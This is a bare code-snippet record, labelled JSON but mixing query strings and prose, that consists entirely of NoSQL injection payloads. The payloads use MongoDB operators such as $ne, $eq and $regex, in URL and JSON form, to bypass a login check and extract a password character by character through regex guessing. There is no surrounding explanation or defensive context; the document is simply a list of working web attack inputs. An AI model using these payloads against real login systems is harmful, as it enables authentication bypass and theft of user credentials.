---
id: bd0ea9c1-907b-4bff-8a92-4c531edbbef5
type: code
language: json
verified: false
created_at: '2023-04-06T03:56:31.467005+00:00'
updated_at: '2023-04-10T20:23:02.399033+00:00'
---

# Code Snippet bd0ea9c1

**Language**: json

```json
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
